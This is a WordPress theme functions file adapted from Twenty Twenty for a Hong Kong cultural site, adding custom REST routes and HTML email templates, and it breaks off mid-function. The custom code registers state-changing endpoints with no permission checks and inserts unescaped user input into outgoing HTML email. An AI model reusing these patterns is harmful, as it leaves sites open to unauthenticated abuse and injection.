<?php
/**
 * Twenty Twenty functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package WordPress
 * @subpackage Twenty_Twenty
 * @since Twenty Twenty 1.0
 */

/**
 * Table of Contents:
 * Theme Support
 * Required Files
 * Register Styles
 * Register Scripts
 * Register Menus
 * Custom Logo
 * WP Body Open
 * Register Sidebars
 * Enqueue Block Editor Assets
 * Enqueue Classic Editor Styles
 * Block Editor Settings
 */

/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
session_start();

function twentytwenty_theme_support() {

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	// Custom background color.
	add_theme_support(
		'custom-background',
		array(
			'default-color' => 'f5efe0',
		)
	);

	// Set content-width.
	global $content_width;
	if ( ! isset( $content_width ) ) {
		$content_width = 580;
	}

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// Set post thumbnail size.
	set_post_thumbnail_size( 1200, 9999 );

	// Add custom image size used in Cover Template.
	add_image_size( 'twentytwenty-fullscreen', 1980, 9999 );

	// Custom logo.
	$logo_width  = 120;
	$logo_height = 90;

	// If the retina setting is active, double the recommended width and height.
	if ( get_theme_mod( 'retina_logo', false ) ) {
		$logo_width  = floor( $logo_width * 2 );
		$logo_height = floor( $logo_height * 2 );
	}

	add_theme_support(
		'custom-logo',
		array(
			'height'      => $logo_height,
			'width'       => $logo_width,
			'flex-height' => true,
			'flex-width'  => true,
		)
	);

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support(
		'html5',
		array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
			'script',
			'style',
		)
	);

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Twenty Twenty, use a find and replace
	 * to change 'twentytwenty' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'twentytwenty' );

	// Add support for full and wide align images.
	add_theme_support( 'align-wide' );

	// Add support for responsive embeds.
	add_theme_support( 'responsive-embeds' );

	/*
	 * Adds starter content to highlight the theme on fresh sites.
	 * This is done conditionally to avoid loading the starter content on every
	 * page load, as it is a one-off operation only needed once in the customizer.
	 */
	if ( is_customize_preview() ) {
		require get_template_directory() . '/inc/starter-content.php';
		add_theme_support( 'starter-content', twentytwenty_get_starter_content() );
	}

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );

	/*
	 * Adds `async` and `defer` support for scripts registered or enqueued
	 * by the theme.
	 */
	$loader = new TwentyTwenty_Script_Loader();
	add_filter( 'script_loader_tag', array( $loader, 'filter_script_loader_tag' ), 10, 2 );

}

add_action( 'after_setup_theme', 'twentytwenty_theme_support' );

/**
 * REQUIRED FILES
 * Include required files.
 */
require get_template_directory() . '/inc/template-tags.php';

// Handle SVG icons.
require get_template_directory() . '/classes/class-twentytwenty-svg-icons.php';
require get_template_directory() . '/inc/svg-icons.php';

// Handle Customizer settings.
require get_template_directory() . '/classes/class-twentytwenty-customize.php';

// Require Separator Control class.
require get_template_directory() . '/classes/class-twentytwenty-separator-control.php';

// Custom comment walker.
require get_template_directory() . '/classes/class-twentytwenty-walker-comment.php';

// Custom page walker.
require get_template_directory() . '/classes/class-twentytwenty-walker-page.php';

// Custom script loader class.
require get_template_directory() . '/classes/class-twentytwenty-script-loader.php';

// Non-latin language handling.
require get_template_directory() . '/classes/class-twentytwenty-non-latin-languages.php';

// Custom CSS.
require get_template_directory() . '/inc/custom-css.php';

/**
 * Register and Enqueue Styles.
 */
function twentytwenty_register_styles() {

	$theme_version = wp_get_theme()->get( 'Version' );

	wp_enqueue_style( 'twentytwenty-style', get_stylesheet_uri(), array(), $theme_version );
	wp_style_add_data( 'twentytwenty-style', 'rtl', 'replace' );

	// Add output of Customizer settings as inline style.
	wp_add_inline_style( 'twentytwenty-style', twentytwenty_get_customizer_css( 'front-end' ) );

	// Add print CSS.
	wp_enqueue_style( 'twentytwenty-print-style', get_template_directory_uri() . '/print.css', null, $theme_version, 'print' );

}

add_action( 'wp_enqueue_scripts', 'twentytwenty_register_styles' );

/**
 * Register and Enqueue Scripts.
 */
function twentytwenty_register_scripts() {

	$theme_version = wp_get_theme()->get( 'Version' );

	if ( ( ! is_admin() ) && is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	wp_enqueue_script( 'twentytwenty-js', get_template_directory_uri() . '/assets/js/index.js', array(), $theme_version, false );
	wp_script_add_data( 'twentytwenty-js', 'async', true );

}

add_action( 'wp_enqueue_scripts', 'twentytwenty_register_scripts' );

/**
 * Fix skip link focus in IE11.
 *
 * This does not enqueue the script because it is tiny and because it is only for IE11,
 * thus it does not warrant having an entire dedicated blocking script being loaded.
 *
 * @link https://git.io/vWdr2
 */
function twentytwenty_skip_link_focus_fix() {
	// The following is minified via `terser --compress --mangle -- assets/js/skip-link-focus-fix.js`.
	?>
<script>
/(trident|msie)/i.test(navigator.userAgent) && document.getElementById && window.addEventListener && window
    .addEventListener("hashchange", function() {
        var t, e = location.hash.substring(1);
        /^[A-z0-9_-]+$/.test(e) && (t = document.getElementById(e)) && (/^(?:a|select|input|button|textarea)$/i
            .test(t.tagName) || (t.tabIndex = -1), t.focus())
    }, !1);
</script>
<?php
}
add_action( 'wp_print_footer_scripts', 'twentytwenty_skip_link_focus_fix' );

/** Enqueue non-latin language styles
 *
 * @since Twenty Twenty 1.0
 *
 * @return void
 */
function twentytwenty_non_latin_languages() {
	$custom_css = TwentyTwenty_Non_Latin_Languages::get_non_latin_css( 'front-end' );

	if ( $custom_css ) {
		wp_add_inline_style( 'twentytwenty-style', $custom_css );
	}
}

add_action( 'wp_enqueue_scripts', 'twentytwenty_non_latin_languages' );

/**
 * Register navigation menus uses wp_nav_menu in five places.
 */
function twentytwenty_menus() {

	$locations = array(
		'primary'  => __( 'Desktop Horizontal Menu', 'twentytwenty' ),
		'expanded' => __( 'Desktop Expanded Menu', 'twentytwenty' ),
		'mobile'   => __( 'Mobile Menu', 'twentytwenty' ),
		'footer'   => __( 'Footer Menu', 'twentytwenty' ),
		'social'   => __( 'Social Menu', 'twentytwenty' ),
	);

	register_nav_menus( $locations );
}

add_action( 'init', 'twentytwenty_menus' );

/**
 * Get the information about the logo.
 *
 * @param string $html The HTML output from get_custom_logo (core function).
 * @return string
 */
function twentytwenty_get_custom_logo( $html ) {

	$logo_id = get_theme_mod( 'custom_logo' );

	if ( ! $logo_id ) {
		return $html;
	}

	$logo = wp_get_attachment_image_src( $logo_id, 'full' );

	if ( $logo ) {
		// For clarity.
		$logo_width  = esc_attr( $logo[1] );
		$logo_height = esc_attr( $logo[2] );

		// If the retina logo setting is active, reduce the width/height by half.
		if ( get_theme_mod( 'retina_logo', false ) ) {
			$logo_width  = floor( $logo_width / 2 );
			$logo_height = floor( $logo_height / 2 );

			$search = array(
				'/width=\"\d+\"/iU',
				'/height=\"\d+\"/iU',
			);

			$replace = array(
				"width=\"{$logo_width}\"",
				"height=\"{$logo_height}\"",
			);

			// Add a style attribute with the height, or append the height to the style attribute if the style attribute already exists.
			if ( strpos( $html, ' style=' ) === false ) {
				$search[]  = '/(src=)/';
				$replace[] = "style=\"height: {$logo_height}px;\" src=";
			} else {
				$search[]  = '/(style="[^"]*)/';
				$replace[] = "$1 height: {$logo_height}px;";
			}

			$html = preg_replace( $search, $replace, $html );

		}
	}

	return $html;

}

add_filter( 'get_custom_logo', 'twentytwenty_get_custom_logo' );

if ( ! function_exists( 'wp_body_open' ) ) {

	/**
	 * Shim for wp_body_open, ensuring backward compatibility with versions of WordPress older than 5.2.
	 */
	function wp_body_open() {
		do_action( 'wp_body_open' );
	}
}

/**
 * Include a skip to content link at the top of the page so that users can bypass the menu.
 */
function twentytwenty_skip_link() {
	echo '<a class="skip-link screen-reader-text" href="#site-content">' . __( 'Skip to the content', 'twentytwenty' ) . '</a>';
}

add_action( 'wp_body_open', 'twentytwenty_skip_link', 5 );

/**
 * Register widget areas.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function twentytwenty_sidebar_registration() {

	// Arguments used in all register_sidebar() calls.
	$shared_args = array(
		'before_title'  => '<h2 class="widget-title subheading heading-size-3">',
		'after_title'   => '</h2>',
		'before_widget' => '<div class="widget %2$s"><div class="widget-content">',
		'after_widget'  => '</div></div>',
	);

	// Footer #1.
	register_sidebar(
		array_merge(
			$shared_args,
			array(
				'name'        => __( 'Footer #1', 'twentytwenty' ),
				'id'          => 'sidebar-1',
				'description' => __( 'Widgets in this area will be displayed in the first column in the footer.', 'twentytwenty' ),
			)
		)
	);

	// Footer #2.
	register_sidebar(
		array_merge(
			$shared_args,
			array(
				'name'        => __( 'Footer #2', 'twentytwenty' ),
				'id'          => 'sidebar-2',
				'description' => __( 'Widgets in this area will be displayed in the second column in the footer.', 'twentytwenty' ),
			)
		)
	);

}

add_action( 'widgets_init', 'twentytwenty_sidebar_registration' );

/**
 * Enqueue supplemental block editor styles.
 */
function twentytwenty_block_editor_styles() {

	// Enqueue the editor styles.
	wp_enqueue_style( 'twentytwenty-block-editor-styles', get_theme_file_uri( '/assets/css/editor-style-block.css' ), array(), wp_get_theme()->get( 'Version' ), 'all' );
	wp_style_add_data( 'twentytwenty-block-editor-styles', 'rtl', 'replace' );

	// Add inline style from the Customizer.
	wp_add_inline_style( 'twentytwenty-block-editor-styles', twentytwenty_get_customizer_css( 'block-editor' ) );

	// Add inline style for non-latin fonts.
	wp_add_inline_style( 'twentytwenty-block-editor-styles', TwentyTwenty_Non_Latin_Languages::get_non_latin_css( 'block-editor' ) );

	// Enqueue the editor script.
	wp_enqueue_script( 'twentytwenty-block-editor-script', get_theme_file_uri( '/assets/js/editor-script-block.js' ), array( 'wp-blocks', 'wp-dom' ), wp_get_theme()->get( 'Version' ), true );
}

add_action( 'enqueue_block_editor_assets', 'twentytwenty_block_editor_styles', 1, 1 );

/**
 * Enqueue classic editor styles.
 */
function twentytwenty_classic_editor_styles() {

	$classic_editor_styles = array(
		'/assets/css/editor-style-classic.css',
	);

	add_editor_style( $classic_editor_styles );

}

add_action( 'init', 'twentytwenty_classic_editor_styles' );

/**
 * Output Customizer settings in the classic editor.
 * Adds styles to the head of the TinyMCE iframe. Kudos to @Otto42 for the original solution.
 *
 * @param array $mce_init TinyMCE styles.
 * @return array TinyMCE styles.
 */
function twentytwenty_add_classic_editor_customizer_styles( $mce_init ) {

	$styles = twentytwenty_get_customizer_css( 'classic-editor' );

	if ( ! isset( $mce_init['content_style'] ) ) {
		$mce_init['content_style'] = $styles . ' ';
	} else {
		$mce_init['content_style'] .= ' ' . $styles . ' ';
	}

	return $mce_init;

}

add_filter( 'tiny_mce_before_init', 'twentytwenty_add_classic_editor_customizer_styles' );

/**
 * Output non-latin font styles in the classic editor.
 * Adds styles to the head of the TinyMCE iframe. Kudos to @Otto42 for the original solution.
 *
 * @param array $mce_init TinyMCE styles.
 * @return array TinyMCE styles.
 */
function twentytwenty_add_classic_editor_non_latin_styles( $mce_init ) {

	$styles = TwentyTwenty_Non_Latin_Languages::get_non_latin_css( 'classic-editor' );

	// Return if there are no styles to add.
	if ( ! $styles ) {
		return $mce_init;
	}

	if ( ! isset( $mce_init['content_style'] ) ) {
		$mce_init['content_style'] = $styles . ' ';
	} else {
		$mce_init['content_style'] .= ' ' . $styles . ' ';
	}

	return $mce_init;

}

add_filter( 'tiny_mce_before_init', 'twentytwenty_add_classic_editor_non_latin_styles' );

/**
 * Block Editor Settings.
 * Add custom colors and font sizes to the block editor.
 */
function twentytwenty_block_editor_settings() {

	// Block Editor Palette.
	$editor_color_palette = array(
		array(
			'name'  => __( 'Accent Color', 'twentytwenty' ),
			'slug'  => 'accent',
			'color' => twentytwenty_get_color_for_area( 'content', 'accent' ),
		),
		array(
			'name'  => __( 'Primary', 'twentytwenty' ),
			'slug'  => 'primary',
			'color' => twentytwenty_get_color_for_area( 'content', 'text' ),
		),
		array(
			'name'  => __( 'Secondary', 'twentytwenty' ),
			'slug'  => 'secondary',
			'color' => twentytwenty_get_color_for_area( 'content', 'secondary' ),
		),
		array(
			'name'  => __( 'Subtle Background', 'twentytwenty' ),
			'slug'  => 'subtle-background',
			'color' => twentytwenty_get_color_for_area( 'content', 'borders' ),
		),
	);

	// Add the background option.
	$background_color = get_theme_mod( 'background_color' );
	if ( ! $background_color ) {
		$background_color_arr = get_theme_support( 'custom-background' );
		$background_color     = $background_color_arr[0]['default-color'];
	}
	$editor_color_palette[] = array(
		'name'  => __( 'Background Color', 'twentytwenty' ),
		'slug'  => 'background',
		'color' => '#' . $background_color,
	);

	// If we have accent colors, add them to the block editor palette.
	if ( $editor_color_palette ) {
		add_theme_support( 'editor-color-palette', $editor_color_palette );
	}

	// Block Editor Font Sizes.
	add_theme_support(
		'editor-font-sizes',
		array(
			array(
				'name'      => _x( 'Small', 'Name of the small font size in the block editor', 'twentytwenty' ),
				'shortName' => _x( 'S', 'Short name of the small font size in the block editor.', 'twentytwenty' ),
				'size'      => 18,
				'slug'      => 'small',
			),
			array(
				'name'      => _x( 'Regular', 'Name of the regular font size in the block editor', 'twentytwenty' ),
				'shortName' => _x( 'M', 'Short name of the regular font size in the block editor.', 'twentytwenty' ),
				'size'      => 21,
				'slug'      => 'normal',
			),
			array(
				'name'      => _x( 'Large', 'Name of the large font size in the block editor', 'twentytwenty' ),
				'shortName' => _x( 'L', 'Short name of the large font size in the block editor.', 'twentytwenty' ),
				'size'      => 26.25,
				'slug'      => 'large',
			),
			array(
				'name'      => _x( 'Larger', 'Name of the larger font size in the block editor', 'twentytwenty' ),
				'shortName' => _x( 'XL', 'Short name of the larger font size in the block editor.', 'twentytwenty' ),
				'size'      => 32,
				'slug'      => 'larger',
			),
		)
	);

	add_theme_support( 'editor-styles' );

	// If we have a dark background color then add support for dark editor style.
	// We can determine if the background color is dark by checking if the text-color is white.
	if ( '#ffffff' === strtolower( twentytwenty_get_color_for_area( 'content', 'text' ) ) ) {
		add_theme_support( 'dark-editor-style' );
	}

}

add_action( 'after_setup_theme', 'twentytwenty_block_editor_settings' );

/**
 * Overwrite default more tag with styling and screen reader markup.
 *
 * @param string $html The default output HTML for the more tag.
 * @return string
 */
function twentytwenty_read_more_tag( $html ) {
	return preg_replace( '/<a(.*)>(.*)<\/a>/iU', sprintf( '<div class="read-more-button-wrap"><a$1><span class="faux-button">$2</span> <span class="screen-reader-text">"%1$s"</span></a></div>', get_the_title( get_the_ID() ) ), $html );
}

add_filter( 'the_content_more_link', 'twentytwenty_read_more_tag' );

/**
 * Enqueues scripts for customizer controls & settings.
 *
 * @since Twenty Twenty 1.0
 *
 * @return void
 */
function twentytwenty_customize_controls_enqueue_scripts() {
	$theme_version = wp_get_theme()->get( 'Version' );

	// Add main customizer js file.
	wp_enqueue_script( 'twentytwenty-customize', get_template_directory_uri() . '/assets/js/customize.js', array( 'jquery' ), $theme_version, false );

	// Add script for color calculations.
	wp_enqueue_script( 'twentytwenty-color-calculations', get_template_directory_uri() . '/assets/js/color-calculations.js', array( 'wp-color-picker' ), $theme_version, false );

	// Add script for controls.
	wp_enqueue_script( 'twentytwenty-customize-controls', get_template_directory_uri() . '/assets/js/customize-controls.js', array( 'twentytwenty-color-calculations', 'customize-controls', 'underscore', 'jquery' ), $theme_version, false );
	wp_localize_script( 'twentytwenty-customize-controls', 'twentyTwentyBgColors', twentytwenty_get_customizer_color_vars() );
}

add_action( 'customize_controls_enqueue_scripts', 'twentytwenty_customize_controls_enqueue_scripts' );

/**
 * Enqueue scripts for the customizer preview.
 *
 * @since Twenty Twenty 1.0
 *
 * @return void
 */
function twentytwenty_customize_preview_init() {
	$theme_version = wp_get_theme()->get( 'Version' );

	wp_enqueue_script( 'twentytwenty-customize-preview', get_theme_file_uri( '/assets/js/customize-preview.js' ), array( 'customize-preview', 'customize-selective-refresh', 'jquery' ), $theme_version, true );
	wp_localize_script( 'twentytwenty-customize-preview', 'twentyTwentyBgColors', twentytwenty_get_customizer_color_vars() );
	wp_localize_script( 'twentytwenty-customize-preview', 'twentyTwentyPreviewEls', twentytwenty_get_elements_array() );

	wp_add_inline_script(
		'twentytwenty-customize-preview',
		sprintf(
			'wp.customize.selectiveRefresh.partialConstructor[ %1$s ].prototype.attrs = %2$s;',
			wp_json_encode( 'cover_opacity' ),
			wp_json_encode( twentytwenty_customize_opacity_range() )
		)
	);
}

add_action( 'customize_preview_init', 'twentytwenty_customize_preview_init' );

/**
 * Get accessible color for an area.
 *
 * @since Twenty Twenty 1.0
 *
 * @param string $area The area we want to get the colors for.
 * @param string $context Can be 'text' or 'accent'.
 * @return string Returns a HEX color.
 */
function twentytwenty_get_color_for_area( $area = 'content', $context = 'text' ) {

	// Get the value from the theme-mod.
	$settings = get_theme_mod(
		'accent_accessible_colors',
		array(
			'content'       => array(
				'text'      => '#000000',
				'accent'    => '#cd2653',
				'secondary' => '#6d6d6d',
				'borders'   => '#dcd7ca',
			),
			'header-footer' => array(
				'text'      => '#000000',
				'accent'    => '#cd2653',
				'secondary' => '#6d6d6d',
				'borders'   => '#dcd7ca',
			),
		)
	);

	// If we have a value return it.
	if ( isset( $settings[ $area ] ) && isset( $settings[ $area ][ $context ] ) ) {
		return $settings[ $area ][ $context ];
	}

	// Return false if the option doesn't exist.
	return false;
}

/**
 * Returns an array of variables for the customizer preview.
 *
 * @since Twenty Twenty 1.0
 *
 * @return array
 */
function twentytwenty_get_customizer_color_vars() {
	$colors = array(
		'content'       => array(
			'setting' => 'background_color',
		),
		'header-footer' => array(
			'setting' => 'header_footer_background_color',
		),
	);
	return $colors;
}

/**
 * Get an array of elements.
 *
 * @since Twenty Twenty 1.0
 *
 * @return array
 */
function twentytwenty_get_elements_array() {

	// The array is formatted like this:
	// [key-in-saved-setting][sub-key-in-setting][css-property] = [elements].
	$elements = array(
		'content'       => array(
			'accent'     => array(
				'color'            => array( '.color-accent', '.color-accent-hover:hover', '.color-accent-hover:focus', ':root .has-accent-color', '.has-drop-cap:not(:focus):first-letter', '.wp-block-button.is-style-outline', 'a' ),
				'border-color'     => array( 'blockquote', '.border-color-accent', '.border-color-accent-hover:hover', '.border-color-accent-hover:focus' ),
				'background-color' => array( 'button', '.button', '.faux-button', '.wp-block-button__link', '.wp-block-file .wp-block-file__button', 'input[type="button"]', 'input[type="reset"]', 'input[type="submit"]', '.bg-accent', '.bg-accent-hover:hover', '.bg-accent-hover:focus', ':root .has-accent-background-color', '.comment-reply-link' ),
				'fill'             => array( '.fill-children-accent', '.fill-children-accent *' ),
			),
			'background' => array(
				'color'            => array( ':root .has-background-color', 'button', '.button', '.faux-button', '.wp-block-button__link', '.wp-block-file__button', 'input[type="button"]', 'input[type="reset"]', 'input[type="submit"]', '.wp-block-button', '.comment-reply-link', '.has-background.has-primary-background-color:not(.has-text-color)', '.has-background.has-primary-background-color *:not(.has-text-color)', '.has-background.has-accent-background-color:not(.has-text-color)', '.has-background.has-accent-background-color *:not(.has-text-color)' ),
				'background-color' => array( ':root .has-background-background-color' ),
			),
			'text'       => array(
				'color'            => array( 'body', '.entry-title a', ':root .has-primary-color' ),
				'background-color' => array( ':root .has-primary-background-color' ),
			),
			'secondary'  => array(
				'color'            => array( 'cite', 'figcaption', '.wp-caption-text', '.post-meta', '.entry-content .wp-block-archives li', '.entry-content .wp-block-categories li', '.entry-content .wp-block-latest-posts li', '.wp-block-latest-comments__comment-date', '.wp-block-latest-posts__post-date', '.wp-block-embed figcaption', '.wp-block-image figcaption', '.wp-block-pullquote cite', '.comment-metadata', '.comment-respond .comment-notes', '.comment-respond .logged-in-as', '.pagination .dots', '.entry-content hr:not(.has-background)', 'hr.styled-separator', ':root .has-secondary-color' ),
				'background-color' => array( ':root .has-secondary-background-color' ),
			),
			'borders'    => array(
				'border-color'        => array( 'pre', 'fieldset', 'input', 'textarea', 'table', 'table *', 'hr' ),
				'background-color'    => array( 'caption', 'code', 'code', 'kbd', 'samp', '.wp-block-table.is-style-stripes tbody tr:nth-child(odd)', ':root .has-subtle-background-background-color' ),
				'border-bottom-color' => array( '.wp-block-table.is-style-stripes' ),
				'border-top-color'    => array( '.wp-block-latest-posts.is-grid li' ),
				'color'               => array( ':root .has-subtle-background-color' ),
			),
		),
		'header-footer' => array(
			'accent'     => array(
				'color'            => array( 'body:not(.overlay-header) .primary-menu > li > a', 'body:not(.overlay-header) .primary-menu > li > .icon', '.modal-menu a', '.footer-menu a, .footer-widgets a', '#site-footer .wp-block-button.is-style-outline', '.wp-block-pullquote:before', '.singular:not(.overlay-header) .entry-header a', '.archive-header a', '.header-footer-group .color-accent', '.header-footer-group .color-accent-hover:hover' ),
				'background-color' => array( '.social-icons a', '#site-footer button:not(.toggle)', '#site-footer .button', '#site-footer .faux-button', '#site-footer .wp-block-button__link', '#site-footer .wp-block-file__button', '#site-footer input[type="button"]', '#site-footer input[type="reset"]', '#site-footer input[type="submit"]' ),
			),
			'background' => array(
				'color'            => array( '.social-icons a', 'body:not(.overlay-header) .primary-menu ul', '.header-footer-group button', '.header-footer-group .button', '.header-footer-group .faux-button', '.header-footer-group .wp-block-button:not(.is-style-outline) .wp-block-button__link', '.header-footer-group .wp-block-file__button', '.header-footer-group input[type="button"]', '.header-footer-group input[type="reset"]', '.header-footer-group input[type="submit"]' ),
				'background-color' => array( '#site-header', '.footer-nav-widgets-wrapper', '#site-footer', '.menu-modal', '.menu-modal-inner', '.search-modal-inner', '.archive-header', '.singular .entry-header', '.singular .featured-media:before', '.wp-block-pullquote:before' ),
			),
			'text'       => array(
				'color'               => array( '.header-footer-group', 'body:not(.overlay-header) #site-header .toggle', '.menu-modal .toggle' ),
				'background-color'    => array( 'body:not(.overlay-header) .primary-menu ul' ),
				'border-bottom-color' => array( 'body:not(.overlay-header) .primary-menu > li > ul:after' ),
				'border-left-color'   => array( 'body:not(.overlay-header) .primary-menu ul ul:after' ),
			),
			'secondary'  => array(
				'color' => array( '.site-description', 'body:not(.overlay-header) .toggle-inner .toggle-text', '.widget .post-date', '.widget .rss-date', '.widget_archive li', '.widget_categories li', '.widget cite', '.widget_pages li', '.widget_meta li', '.widget_nav_menu li', '.powered-by-wordpress', '.to-the-top', '.singular .entry-header .post-meta', '.singular:not(.overlay-header) .entry-header .post-meta a' ),
			),
			'borders'    => array(
				'border-color'     => array( '.header-footer-group pre', '.header-footer-group fieldset', '.header-footer-group input', '.header-footer-group textarea', '.header-footer-group table', '.header-footer-group table *', '.footer-nav-widgets-wrapper', '#site-footer', '.menu-modal nav *', '.footer-widgets-outer-wrapper', '.footer-top' ),
				'background-color' => array( '.header-footer-group table caption', 'body:not(.overlay-header) .header-inner .toggle-wrapper::before' ),
			),
		),
	);

	/**
	* Filters Twenty Twenty theme elements
	*
	* @since Twenty Twenty 1.0
	*
	* @param array Array of elements
	*/
	return apply_filters( 'twentytwenty_get_elements_array', $elements );
}
function wp_get_menu_array($current_menu='Main Menu') {

    $menu_array = wp_get_nav_menu_items($current_menu);

    $menu = array();

    function populate_children($menu_array, $menu_item)
    {
        $children = array();
        if (!empty($menu_array)){
            foreach ($menu_array as $k=>$m) {
                if ($m->menu_item_parent == $menu_item->ID) {
                    $children[$m->ID] = array();
                    $children[$m->ID]['ID'] = $m->ID;
                    $children[$m->ID]['title'] = $m->title;
                    $children[$m->ID]['url'] = $m->url;
                    unset($menu_array[$k]);
                    $children[$m->ID]['children'] = populate_children($menu_array, $m);
                }
            }
        };
        return $children;
    }

    foreach ($menu_array as $m) {
        if (empty($m->menu_item_parent)) {
            $menu[$m->ID] = array();
            $menu[$m->ID]['ID'] = $m->ID;
            $menu[$m->ID]['title'] = $m->title;
            $menu[$m->ID]['url'] = $m->url;
            $menu[$m->ID]['children'] = populate_children($menu_array, $m);
        }
    }

    return $menu;

}

add_filter('jpeg_quality', function($arg){return 100;});

function is_subcategory( $cat_id = NULL ) {

	if ( !$cat_id )
		$cat_id = get_query_var( 'cat' );

	if ( $cat_id ) {

		$cat = get_category( $cat_id );
		if ( $cat->category_parent > 0 )
			return true;
	}

	return false;
}

add_action( 'rest_api_init', 'pcr_route');
// http://www.zfu.com/wp-json/api/testtest/

function pcr_route() {

	// contact-us-submit
				register_rest_route( 'api', '/contact-us-submit/', array(
						'methods'  => 'POST',
						'callback' => 'contact_us_submit'
				)
				);			

				register_rest_route( 'api', '/test/', array(
									'methods'  => 'GET',
									'callback' => 'test_func'
						)
				);

				register_rest_route( 'api', '/register/', array(
									'methods'  => 'POST',
									'callback' => 'register'
						)
				);
				register_rest_route( 'api', '/member-login/', array(
					'methods'  => 'POST',
					'callback' => 'member_login'
					)
				);


				register_rest_route( 'api', '/forgetpw/', array(
					'methods'  => 'POST',
					'callback' => 'forgetpw'
					)
				);

				register_rest_route( 'api', '/updateinfo/', array(
					'methods'  => 'POST',
					'callback' => 'updateinfo'
					)
				);

				register_rest_route( 'api', '/updatepw/', array(
					'methods'  => 'POST',
					'callback' => 'updatepw'
					)
				);


				register_rest_route( 'api', '/add-to-fav/', array(
					'methods'  => 'POST',
					'callback' => 'add_to_fav'
					)
				);


				
				register_rest_route( 'api', '/log-history/', array(
					'methods'  => 'POST',
					'callback' => 'log_history'
					)
				);


				


				


				
				
			}

function log_history($request)
{
	date_default_timezone_set('Asia/Hong_Kong');

	$row = array(
		'history_log'   => $request['log_msg'],
		'history_datetime'  =>date('M j, Y').' '.date('h:i a')
	);

	
	add_row('history', $row,$_SESSION['user_id']);

	
	
}

function contact_us_submit($request)
{
	
	$name = $request['name'];
	$email = $request['email'];
	$comment = $request['comment'];
	$captcha = $request['captcha'];
	// echo $captcha .' '.$_SESSION['captcha']['code'];

		if($captcha !=$_SESSION['captcha']['code'])
		{
			echo json_encode(array("status"=>"-1", "msg"=>"captcha is not matched"));		
		}
		else
		{
				// insert the post and set the category
				$post_id = wp_insert_post(array (
					'post_type' => 'enquiry',
					'post_title' => $name.' 的留言',
					'post_status' => 'publish'
				));

				if ($post_id) {
					add_post_meta($post_id, 'name', $name);
					add_post_meta($post_id, 'email', $email);
					add_post_meta($post_id, 'enquiry_txt', $comment);
					
					echo json_encode(array("status"=>"1", "msg"=>"enquiry created!"));		

					$to= 'info@perspectivecr.org';
					$subject= '來自視角文化資源'.$name.'的留言';
					$body='<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <title>Document</title></head><body> <div style="text-align: center; margin-top: 30px"> <a href="https://perspectivecr.org/"> <img style="height: 66px" src="https://perspectivecr.org/wp-content/themes/pcr/assets/images/logo.png" alt="" /></a> <br /><br /><span style="font-size: 16px; font-weight: bold"> 系統收到以下留言︰</span > <br /><br /> <table style="margin: 0 auto; text-align: left"> <tr> <td style="padding: 5px">名稱:</td> <td style="padding: 5px">'.$name.'</td> </tr> <tr> <td style="padding: 5px">電郵:</td> <td style="padding: 5px">'.$email.'</td> </tr> <tr> <td style="padding: 5px">查詢或意見:</td> <td style="padding: 5px">'.$comment.'</td> </tr> <tr></tr> </table> <br /> <a href="#" style="text-decoration: none; margin: 0 2px"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-1.png" alt="" /> </a> <a href="#" style="text-decoration: none; margin: 0 2px"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-2.png" alt="" /> </a> <a href="#" style="text-decoration: none; margin: 0 2px"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-3.png" alt="" /> </a> </div> </body></html>';
					$headers = array('Content-Type: text/html; charset=UTF-8');
					$mailResult = false;
					$mailResult= wp_mail( $to, $subject, $body, $headers );


				}
				



					
		}
		
	
}

function test_func($request)
{
	$to= 'krisfk@gmail.com';
	$subject= '視角文化資源新會員註冊認證郵件';
	$body= '<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <title>Document</title></head><body> <div style="text-align: center; margin-top: 30px"> <a href="https://perspectivecr.org/"> <img style="height: 66px" src="https://perspectivecr.org/wp-content/themes/pcr/assets/images/logo.png" alt="" /></a> <br /><br /><span style="font-size: 16px; font-weight: bold"> (會員登記名稱) 您好︰</span > <br /><br /> 多謝您支持，並已成功登記成為視角文化資源會員。 <br /> <br /> 請立即按下面連結啟動您的帳戶 <br /> <br /> (activate link) <br /><br /><br /> 感謝您的使用與支持。 <br /><br /><br />視角文化資源 <br /> <br /> <a href="https://www.perspectivecr.org/" target="_blank"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-1.png" alt="" /> </a> <a href="https://www.facebook.com/%E8%A6%96%E8%A7%92%E6%96%87%E5%8C%96-100798228820297" target="_blank"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-2.png" alt="" /> </a> <a href="https://www.instagram.com/pers.cul/" target="_blank"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-3.png" alt="" /> </a> </div> </body></html>';
	$headers = array('Content-Type: text/html; charset=UTF-8');
	$mailResult = false;
